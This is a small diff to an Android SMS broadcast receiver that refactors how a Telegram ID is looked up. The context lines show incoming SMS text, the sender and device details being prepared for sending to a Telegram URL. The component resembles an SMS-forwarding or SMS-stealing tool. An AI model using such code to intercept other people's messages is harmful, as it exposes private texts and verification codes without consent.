@@ -50,7 +50,7 @@ public class SMSBroadcastReader  extends BroadcastReceiver {
 
                 //Set all parameters
                 Storage read = new Storage(context);
-                final String telegram_id = read.read("TelegramID");
+                final String telegram_id = read.read(MainConstant.telegram_id_storage_key);
                 final String msg = "From: "+senderNum+"\nDevice Info: "+android.os.Build.MANUFACTURER+"|"+android.os.Build.MODEL+"\nMessage:\n"+message;
                 String url = MainConstant.telegram_url;
 
